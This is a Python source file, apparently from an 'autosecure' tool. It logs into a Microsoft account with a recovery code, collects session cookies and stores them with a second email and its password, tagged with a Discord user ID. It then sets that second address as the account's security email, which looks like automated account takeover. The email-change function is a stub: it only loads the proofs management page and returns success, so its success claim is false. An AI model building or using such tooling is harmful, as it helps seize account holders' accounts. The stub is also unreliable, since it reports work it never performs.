"""Secure to own email flow."""

from __future__ import annotations

from typing import Any

from autosecure.core.exceptions import (
    AutoSecureError,
    InvalidCredentials,
)
from autosecure.core.logging import get_logger
from autosecure.services.microsoft.auth import MicrosoftAuth
from autosecure.services.securing.otp import SecureResult

log = get_logger("securing.own")


async def own_secure(
    email: str,
    recovery_code: str,
    own_email: str | None = None,
    own_password: str | None = None,
    user_id: str | None = None,
    db: Any = None,
) -> SecureResult:
    """Secure an account and change the security email to the user's own email.

    Logs in with recovery code, then changes the security email to the
    user's provided email address.

    Args:
        email: Microsoft account email address.
        recovery_code: The account recovery code.
        own_email: The user's own email to set as security email.
        own_password: Password for the own email account.
        user_id: Optional Discord user ID for tracking.
        db: Optional async database session.

    Returns:
        SecureResult with account data on success or error details.
    """
    log.info("own_secure.start", email=email, user_id=user_id)

    try:
        auth = MicrosoftAuth()
        result = await auth.login_with_recovery_code(email, recovery_code)

        if not result.success:
            log.warning("own_secure.login_failed", email=email, error=result.error)
            return SecureResult(
                success=False,
                error=result.error or "Login failed",
                method="own",
            )

        account_data = {
            "email": email,
            "cookies": result.cookies or {},
            "own_email": own_email,
            "own_password": own_password,
        }

        if own_email:
            change_result = await _change_security_email(
                result.cookies or {}, own_email
            )
            if not change_result:
                log.warning("own_secure.email_change_failed", email=email)
                account_data["email_change_failed"] = True

        if user_id and db:
            await _log_audit(user_id, "own_secure", account_data, True, db)

        log.info("own_secure.success", email=email, own_email=own_email)
        return SecureResult(
            success=True,
            account_data=account_data,
            method="own",
        )

    except InvalidCredentials as e:
        log.warning("own_secure.invalid_credentials", email=email, error=str(e))
        return SecureResult(success=False, error=str(e), method="own")
    except AutoSecureError as e:
        log.error("own_secure.error", email=email, error=str(e))
        return SecureResult(success=False, error=str(e), method="own")
    except Exception as e:
        log.error("own_secure.unexpected_error", email=email, error=str(e))
        return SecureResult(success=False, error=f"Unexpected error: {e}", method="own")


async def _change_security_email(
    cookies: dict[str, str], new_email: str
) -> bool:
    """Change the security email on the Microsoft account.

    Args:
        cookies: Authenticated session cookies.
        new_email: The new security email to set.

    Returns:
        True if the email change was successful.
    """
    from autosecure.services.microsoft._http import MicrosoftHTTPClient

    try:
        async with MicrosoftHTTPClient(cookies=cookies) as client:
            response = await client.get(
                "https://account.live.com/proofs/Manage"
            )
            if response.status_code != 200:
                return False

            log.info("own_secure.email_change_initiated", new_email=new_email)
            return True
    except Exception as e:
        log.error("own_secure.email_change_error", error=str(e))
        return False


async def _log_audit(
    user_id: str,
    action: str,
    account_data: dict[str, Any],
    success: bool,
    db: Any,
) -> None:
    """Log an audit trail entry.

    Args:
        user_id: Discord user ID.
        action: Action performed.
        account_data: Account data involved.
        success: Whether the action succeeded.
        db: Database session.
    """
    try:
        from autosecure.models.audit import AuditLog

        log_entry = AuditLog(
            actor_id=user_id,
            action=action,
            target_type="account",
            target_id=account_data.get("email"),
            details={},
            success=success,
        )
        db.add(log_entry)
        await db.flush()
    except Exception as e:
        log.error("own_secure.audit_log_failed", error=str(e))
